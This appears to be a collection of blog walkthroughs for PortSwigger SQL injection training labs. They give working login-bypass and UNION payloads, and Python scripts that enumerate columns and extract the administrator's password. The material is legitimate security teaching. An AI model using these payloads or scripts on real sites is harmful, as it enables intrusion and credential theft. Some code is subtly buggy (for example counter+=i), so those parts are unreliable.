        "content": "Lab 6: SQL injection UNION attack, retrieving multiple values in a single column: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables.\nThe database contains a different table called users, with columns called username and password.\nTo solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.\nInitial Reconnaissance/Discovery: We are given access to a simple web application which allows us to filter categories of products using the filters on the page, there is also a \u0026ldquo;My account\u0026rdquo; section.\nWe already know the \u0026ldquo;category\u0026rdquo; parameter is vulnerable based on the previous lab however let\u0026rsquo;s re-verify this.\nEstablishing SQLi: If we send request to repeater we can inject a single quote ' after the parameter and see we trigger a 500 response. If then add a single another quote we can see that the page returns a 200 OK response. Inferring The SQL Query Being Run: Looking at the way the page we returns information can infer the query being run is similar to the below.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39; AND [rest of query] When we add our single quote it becomes the below which is syntactically incorrect.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39; AND [rest of query] However when we add another quote it becomes the below, closing off the first quotation mark we provided.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39;\u0026#39; AND [rest of query] UNION SELECT Requirements: As the lab wants us to retrieve data using a UNION SELECT query we also need to ensure that the two requirements for this attack are met:\nThe queries must return the same amount of columns: This means that if the original query that is searching the database returns 5 columns our UNION query must also return 5 columns.\nTo solve this issue: We will enumerate the number of columns being returned by the original query. The data types in the columns must be compatible with each query: This means that if the table is returning strings such as item names in column 1 our UNION query has to also return strings or a compatible data type.\nTo solve this issue: Initially we will use a simple method of returning NULL values. This is because NULL is convertible/compatible to every data type, so it will mean that the payload should succeed. Once we have established our column count we will then start enumerating the data type of the columns \u0026amp; eventually extract data. Establishing The Number Of Columns Using UNION SELECT Statement: Using Burp: In order for us to display data we need to establish how many columns are in the existing database.\nIf we return back to repeater we can enter the payload\n\u0026#39; UNION SELECT NULL-- We then select the payload \u0026amp; press CTRL+U to URL encode it. If we send this payload we get a 500 response meaning the number of columns is not correct, so add another NULL so our payload and repeat the process.\n\u0026#39; UNION SELECT NULL,NULL-- This time we get a 200 response so we know this particular table has 2 columns. If we go to the browser and put our payload in we can actually see the additional row being rendered with no (NULL) values. Using Python: As usual I am going to show how this can also be solved using Python.\nPrep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: Proxies \u0026amp; URL:\nWe declare an array of proxies to proxy our requests through as well as the unique url \u0026amp; category endpoint. Note: The category and URL vary from instance to instance.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0aa9007a0350e042804fee0b002f0021.web-security-academy.net/filter?category=Gifts\u0026#34; SQL Syntax \u0026amp; Counters:\nSo now we have our payload broken up into various elements, the reason for this is because we don\u0026rsquo;t want to just supply a list of multiple UNION SELECT statements, doing it this way offers more flexibility as well as ensuring we don\u0026rsquo;t repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn\u0026rsquo;t advise that but you could)\nunion=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 We also create a counter variable and set it to 2. This counter is used to track how many NULL values (columns) are in our UNION SELECT payload as we build it. Our starting payload is:\npayload = union + nullPayload # \u0026#34;\u0026#39; UNION SELECT NULL\u0026#34; So before the loop runs we already have one NULL in the query. Inside the loop, we keep appending more ,NULL values to payload and update counter to reflect the number of columns.\nWe don’t start the counter at 0 because SQL columns are conceptually counted from 1 (first column, second column etc…) and our payload already includes the first NULL column. If we started from 0, the value of counter would always lag behind the actual number of NULL columns in the query. By starting at 2, the value of counter stays aligned with the true column count once we begin adding additional NULL values in the loop.\nFor Loop With Request: We declare a for loop will which repeat for 10 total iterations.\nThen we have a try block which will send our get request to the url with payload \u0026amp; comment.\nResponse Monitoring: We then monitor the responses and if the value \u0026ldquo;My account\u0026rdquo; is found in the body of the response we will:\nPrint the string \u0026quot;Valid payload {payload}-- there are {counter} columns.\u0026quot; which will contain the actual payload as well as the number of columns. Print the full Lab URL including comment and payload so we can easily verify it in a browser. If these above conditions are met it will break out of the loop and stop the process.\nIf the above is not found it will add an additional NULL value using the additionalNull variable to the payload \u0026amp; increment the counter by 1 and continue.\nfor i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) break payload=payload+additionalNull counter+=i Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os import urllib.parse requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) from bs4 import BeautifulSoup proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0ae600e20460c97e847fd7ab000c0019.web-security-academy.net/filter?category=Gifts\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Running The Script: As we can see it tells what we expect, there are 2 columns and the correction payload is:\n\u0026#39; UNION SELECT NULL,NULL-- Establishing Column Data Type VIA UNION SELECT Statement: Using Burp: Much like how we established the number of columns we can use repeater to determine the column data type.\nWe know to pass the lab we need to extract the administrators username \u0026amp; password in a single column, then login. Typically usernames and passwords would be a string data type in the database. So to enumerate this we will systematically start replacing the NULL values of our payload with the string values 'a'. This means our payload becomes:\n\u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,NULL-- \u0026#39;+UNION+SELECT+NULL,\u0026#39;a\u0026#39;-- \u0026#39;+UNION+SELECT+\u0026#39;a\u0026#39;,\u0026#39;a\u0026#39;-- As we can the first column is not compatible with the string datatype as we get a 500 response. We now modify our payload so the string value is in the second NULL position and revert the first position to be NULL again.\n\u0026#39;+UNION+SELECT+NULL,\u0026#39;a\u0026#39;-- We can see this worked and the second position is compatible with the string datatype. Using Python: We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we have added.\n+compatible=0 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) + payloadList=[nullPayload] * counter + for y in range(len(payloadList)): + if payloadList[y] == \u0026#34;NULL\u0026#34;: + payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; + newPayload=(\u0026#34;,\u0026#34;.join(payloadList)) + request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) + if \u0026#39;My account\u0026#39; in request.text: + print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) + compatible+=1 + if compatible \u0026gt; 1: + print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) + payloadList[y] = \u0026#34;NULL\u0026#34; payload=payload+additionalNull counter+=i Compatible Variable: This is going to be used later on to print out a specific message if we find more than 1 compatible data type column so at the moment we set this with a value of 0.\nList Creation: We then create a payloadList that\u0026rsquo;s contents is the value of nullPayload (which is \u0026ldquo;NULL\u0026rdquo;) and this is equal to the value of the counter so if the counter is 2 then the list value is ['NULL', 'NULL']\npayloadList=[nullPayload] * counter List Iteration:\nif payloadList[y] == \u0026#34;NULL\u0026#34;: payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; We now iterate through the length of the list and if the value of y in the list is equal to NULL (which it will be) we replace that with the with a string called string. So on the first run it would ['string', NULL].\nNew Payload Creation:\nnewPayload=(\u0026#34;,\u0026#34;.join(payloadList)) We then join our list together into a string so we can pass this to our request later, and we ensure we separate with a comma , other wise our payload would be \u0026quot;'string'NULLNULL\u0026quot;\nSend our Request:\nrequest=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) Next we send our request like before but this time we are using our new payload. We also need to ensure we send the \u0026quot;union\u0026quot; variable as this is not currently present in our list/string/payloadstring.\nWe also perform the same type of check in the body of the request for the string \u0026ldquo;My account\u0026rdquo; which will signify that we have had a 200 OK response, and in this event it will print out the payload.\nCompatible Logic Counter: If the above conditions are met we increment our compatible counter by 1. We then perform a check if the counter is greater than 1 and if it is we print out the total number of compatible data types found and suggest the user combine the payloads.\ncompatible+=1 if compatible \u0026gt; 1: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) Reset The NULL Value:\npayloadList[y] = \u0026#34;NULL\u0026#34; In the event that we do not get a 200 response we rest the list position y to be NULL again as other wise the list would just be full of the lab string.\nAs we can see when we run the script it prints out the compatible data type fields in position 1 \u0026amp; 2 and also suggests we combine the payloads as they are both valid. Extracting Column Data VIA UNION SELECT Statement: We know there is a \u0026ldquo;users\u0026rdquo; table that has a \u0026ldquo;username\u0026rdquo; \u0026amp; \u0026ldquo;password\u0026rdquo; column that we need to extract data from however we only have access to one column which has a compatible datatype, so how do we extract data?\nConcatenating Values From Multiple Columns: In order to retrieve multiple values within a single column we need to concatenate the values from each together and then output them to the single compatible column. Luckily for us we can use a separator like : so we can easily tell the two values apart.\nIn order for us to be able to use concatenation we need to establish what type of database in use as the syntax can be different for each type of database.\nWe can easily query the database type by using any of the below payloads:\n--Oracle Pyaloads \u0026#39; UNION SELECT NULL,SELECT banner FROM v$version-- \u0026#39; UNION SELECT NULL,version FROM v$instance-- --Microsoft Payloads \u0026#39; UNION SELECT NULL,SELECT @@version-- --PostgreSQL Payload \u0026#39; UNION SELECT NULL,version()-- --MySQL Payload \u0026#39; UNION SELECT NULL,@@version-- We can see this database is PostgreSQL running on ubuntu. This means we can use the following concatenation syntax.\n\u0026#39;foo\u0026#39;||\u0026#39;bar\u0026#39; This means our payload will be, this means it should output information in the following format username:password.\n\u0026#39; UNION SELECT NULL,username || \u0026#39;:\u0026#39; || password FROM users-- Using Burp: Let\u0026rsquo;s use the above query in burpsuite to extract the data.\n\u0026#39; UNION SELECT NULL,username || \u0026#39;:\u0026#39; || password FROM users-- We can see this works and the username \u0026amp; passwords for users are displayed as single strings in the existing content. We can now login as the administrator to solve the lab. Using Python: We can also use python to extract the administrators password directly too.\nAdditional Import: For us to parse and extract the administrators password we need the BeautifulSoup library and as we will be using regular expressions we need the re library.\nfrom bs4 import BeautifulSoup import re def extractSQLusers(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT NULL,username || \u0026#39;:\u0026#39; || password FROM users--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;administrator\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) administratorPass = soup.find(string=re.compile(r\u0026#39;^administrator\u0026#39;)) print(f\u0026#34;The administrator credentials are: {administratorPass}\u0026#34;) return True return False Function definition \u0026amp; payload First we define the function called extractSQLusers we then declare our sqlPayload.\ndef extractSQLusers(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT NULL,username || \u0026#39;:\u0026#39; || password FROM users--\u0026#34; Send a request \u0026amp; store the response: We send our payload and store the response in a variable called response.\nrequest=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text Parse response:\nif \u0026#34;administrator:\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) administratorPass = soup.find(string=re.compile(r\u0026#39;^administrator\u0026#39;)) print(f\u0026#34;The administrator credentials are: {administratorPass}\u0026#34;) return True return False If we find the string \u0026ldquo;administrator\u0026rdquo; in the response this tells us the table of users has been returned.\nWe pass the HTML body from the HTTP response into beautiful soups HTML parser so it can turn the raw HTML into a structured object we can search through.\nWe then search through this HTML for the regular expression string \u0026quot;^administrator\u0026quot; which is searching for a string starting with the word \u0026ldquo;administrator\u0026rdquo;, the reason we do this is we do not have two separate values, instead we have administrator username concatenated with the password string and a separator of :, meaning if we just searched for \u0026quot;administrator\u0026quot; nothing would show up as that string does not exist, however strings start with the word administrator.\nWe then print the value of this found string.\nCall the Function: We now call the function so it runs after our other conditions are satisfied.\nif \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 + if compatible \u0026gt; 0: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) + extractSQLusers() payloadList[y] = \u0026#34;NULL\u0026#34; Note: We changed the if compatible value from 1 to 0 so this will trigger.\nAs we can see it works when we run it and we are given the administrators password. Whole Script: #!/usr/bin/env python3 import requests import os import urllib.parse requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) from bs4 import BeautifulSoup import re proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0ae600e20460c97e847fd7ab000c0019.web-security-academy.net/filter?category=Gifts\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 compatible=0 def extractSQLusers(): sqlPayload=\u0026#34;\u0026#39; UNION SELECT NULL,username || \u0026#39;:\u0026#39; || password FROM users--\u0026#34; request=requests.get(url + sqlPayload, proxies=proxies, verify=False, timeout=3) response=request.text if \u0026#34;administrator\u0026#34; in response: soup = BeautifulSoup(request.text, \u0026#39;html.parser\u0026#39;) administratorPass = soup.find(string=re.compile(r\u0026#39;^administrator\u0026#39;)) print(f\u0026#34;The administrator credentials are: {administratorPass}\u0026#34;) return True return False for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(\u0026#34;---\u0026#34;) print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) print(\u0026#34;---\u0026#34;) payloadList=[nullPayload] * counter for y in range(len(payloadList)): if payloadList[y] == \u0026#34;NULL\u0026#34;: payloadList[y] = \u0026#34;\u0026#39;string\u0026#39;\u0026#34; newPayload=(\u0026#34;,\u0026#34;.join(payloadList)) request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Compatible data type found {union+newPayload+comment}\u0026#34;) compatible+=1 if compatible \u0026gt; 0: print(f\u0026#34;{compatible} compatible data type columns found, suggest combining payloads\u0026#34;) extractSQLusers() payloadList[y] = \u0026#34;NULL\u0026#34; payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) ",

        "content": "Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: SELECT * FROM products WHERE category = 'Gifts' AND released = 1\nTo solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.\nInitial Reconnaissance/Discovery: We have access to a simple shop front where we can filter for products. When clicking a category we can see it\u0026rsquo;s passed as a parameter in the url Let\u0026rsquo;s send a request to repeater so we can start to test for SQli.\nTesting For SQli: In repeater we can add a single quote after the paramater ' and can see we get 500 error. If we add an additional quote, thereby closing off the original quote we can see we no longer get an error. This means our input is being interpretted as SQL syntax confirming that the application is vulnerable to SQLi. Forcing The Application TO Show All Items In a Category: We can add the payload 'OR 1=1--\u0026rsquo;~ which when url encoded is '+OR+1%3d1-- this makes the url string. And if we check the application we can see we have solved the lab. Why This Works: As the application is performing a query like below when displaying items.\nSELECT * FROM products WHERE category = \u0026#39;Accessories\u0026#39; AND released = 1 When we add on our payload, the query becomes the below.\nSELECT * FROM products WHERE category = \u0026#39;Accessories\u0026#39; OR 1=1-- AND released = 1 As we are injecting our query of 1=1 which will always resolve to TRUE \u0026amp; commenting out the remainder of the query nullifying the AND clause so it is never evaluated so the query will fetch ALL items from the accessories category as 1=1.\n",

        "content": "Lab 2: SQL injection vulnerability allowing login bypass: This lab contains a SQL injection vulnerability in the login function.\nTo solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.\nInitial Reconnaissance/Discovery: When we access the application we can see there is a \u0026ldquo;My account\u0026rdquo; page. If we click it we can see we can login. Let\u0026rsquo;s enter some fake credentials to view the login process. This looks like a standard response. Finding SQLi Vulnerability In the Username Field: If we send the request to repeater we can add a single quote ' after the username we have entered and send the request. Doing so we can see we get a 500 Internal Server Error response.\nIf we then add an additional single quote so it reads test'' we get a 200 OK response. This shows that our input is being interpretted as SQL syntax. Inferring The SQL Query Being Run: Looking at the way the page we returns information can infer the query being run is similar to the below.\nSELECT * FROM users WHERE username = \u0026#39;test\u0026#39; AND password = \u0026#39;test\u0026#39; However when we add our single quote it becomes which is syntactically incorrect in SQL as we have an open quotation mark.\nSELECT * FROM users WHERE username = \u0026#39;test\u0026#39;\u0026#39; AND password = \u0026#39;test\u0026#39; Then when we add our second single quote this closes our first single quote and the SQL is valid, although ugly.\nSELECT * FROM users WHERE username = \u0026#39;test\u0026#39;\u0026#39;\u0026#39; AND password = \u0026#39;test\u0026#39; Working along these lines this means we could attempt to comment out the remainder of the SQL query by having a payload of [username]'-- effectively bypassing the password check and allowing us to login.\nSELECT * FROM users WHERE username = \u0026#39;username\u0026#39;--\u0026#39; AND password = \u0026#39;\u0026#39; If we do this for the \u0026ldquo;administrator\u0026rdquo; user. Note: You can put ANY value you want for the password as it will be ignored.\nThis works and we are no logged in. This is due to our payload making the SQL query into the below, bypassing the password check.\nSELECT * FROM users WHERE username = \u0026#39;administrator\u0026#39;--\u0026#39; AND password = \u0026#39;\u0026#39; ",

        "content": "Lab 3: SQL injection UNION attack, determining the number of columns returned by the query: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.\nTo solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.\nInitial Reconnaissance/Discovery: Looking at the page we can see there are a list of products displayed in a table and we can further filter these by using the search category selector. If we filter for the a category we can see this is passed as a parameter in the url. Establishing SQLi: If we send the request to repeater we can inject a single quote ' after the parameter and see we trigger a 500 Error response. If then add a single another quote we can see that the page renders correctly. Inferring The SQL Query Being Run: Looking at the way the page we returns information can infer the query being run is similar to the below.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39; AND [rest of query] When we add our single quote it becomes the below which is syntactically incorrect.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39; AND [rest of query] However when we add another quote it becomes the below, closing off the first quotation mark we provided.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39;\u0026#39; AND [rest of query] UNION Query Requirements: As the lab wants us to display the data using a UNION SELECT query we also need to ensure that the two requirements for this attack are met:\nThe queries must return the same amount of columns: This means that if the original query that is searching the database returns 5 columns our UNION query must also return 5 columns. To solve this issue: We will enumerate the number of columns being returned by the original query. The data types in the columns must be compatible with each query: This means that if the table is returning strings such as item names in column 1 our UNION query has to also return strings or a compatible data type. To solve this issue: We will use a simple method of returning NULL values in this case. This is because NULL is convertible/compatible to every data type, so it will mean that the payload should succeed. Enumerating The Number Of Columns Using ORDER BY Method: In order for us to fulfill the labs requirements we need to display an additional column with NULL values, however for us to do that we need to establish how many columns there are in the table being pulled from. We can do this using the ORDER BY method.\nThis works, by modifying the original query to order the returned results by different columns in the results. This works particularly well as we can just specify a column number we want to order by meaning we don\u0026rsquo;t need to know the names of the columns themselves.\nWhat is also useful is that when we exceed the number of columns available this will cause an error meaning that if submit order by payloads and they all return 200 up until we hit ORDER BY 15-- we know that the total number of columns is 14.\nBurp Suite ORDER By Enumeration: In burpsuite we can place the payload below after the category\n\u0026#39;+ORDER+BY+1-- We then increment the number up until we get an error, in this case 4 returned an error meaning that the table has a total of 3 columns. Displaying The Data Using UNION SELECT: Now we have the total number of columns this means we can use UNION SELECT to display the data.\nAs the table has three columns we will use the payload below.\n\u0026#39; UNION SELECT NULL,NULL,NULL-- As we can see it worked and an additional row is present containing no values. If we remove the UNION SELECT query we can see the row is removed. +Note+: It is also possible to complete this lab just using the UNION SELECT method and increasing the number of columns by incrementing the NULL value.\nSolving The Whole Lab With Python. Prep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: Proxies \u0026amp; URL: We declare an array of proxies to proxy our requests through as well as the unique url \u0026amp; category endpoint. +Note+: The category and URL vary from instance to instance.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a5200e704e3800f80b0e46100b00036.web-security-academy.net/filter?category=Accessories\u0026#34; SQL Syntax \u0026amp; Counters: So now we have our payload broken up into various elements, the reason for this is because we don\u0026rsquo;t want to just supply a list of multiple UNION SELECT statements, doing it this way offers more flexibility as well as ensuring we don\u0026rsquo;t repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn\u0026rsquo;t advise that but you could)\nWe also create a counter variable and set it to 2. This counter is used to track how many NULL values (columns) are in our UNION SELECT payload as we build it. Our starting payload is:\npayload = union + nullPayload # \u0026#34;\u0026#39; UNION SELECT NULL\u0026#34; So before the loop runs we already have one NULL in the query. Inside the loop, we keep appending more ,NULL values to payload and update counter to reflect the number of columns.\nWe don’t start the counter at 0 because SQL columns are conceptually counted from 1 (first column, second column etc…) and our payload already includes the first NULL column. If we started from 0, the value of counter would always lag behind the actual number of NULL columns in the query. By starting at 2, the value of counter stays aligned with the true column count once we begin adding additional NULL values in the loop.\nunion=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 For Loop With Request: We declare a for loop will which repeat for 10 total iterations.\nThen we have a try block which will send our get request to the url with payload \u0026amp; comment.\nResponse Monitoring: We then monitor the responses and if the value \u0026ldquo;My account\u0026rdquo; is found in the body of the response we will:\nPrint the string \u0026quot;Valid payload {payload}-- there are {counter} columns.\u0026quot; which will contain the actual payload as well as the number of columns. Print the full Lab URL including comment and payload so we can easily verify it in a browser. If thesee above conditions are met it will break out of the loop and stop the process.\nIf the above is not found it will add an additional NULL value using the additionalNull variable to the payload \u0026amp; increment the counter by 1 and continue.\nfor i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) break payload=payload+additionalNull counter+=i Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a5200e704e3800f80b0e46100b00036.web-security-academy.net/filter?category=Accessories\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) break payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Executing The Python Script To Solve The Lab: As we can see we solve the lab and can see that the valid number of columns is 3 We are also given the concatenated URL \u0026amp; visiting it will show the NULL row. ",

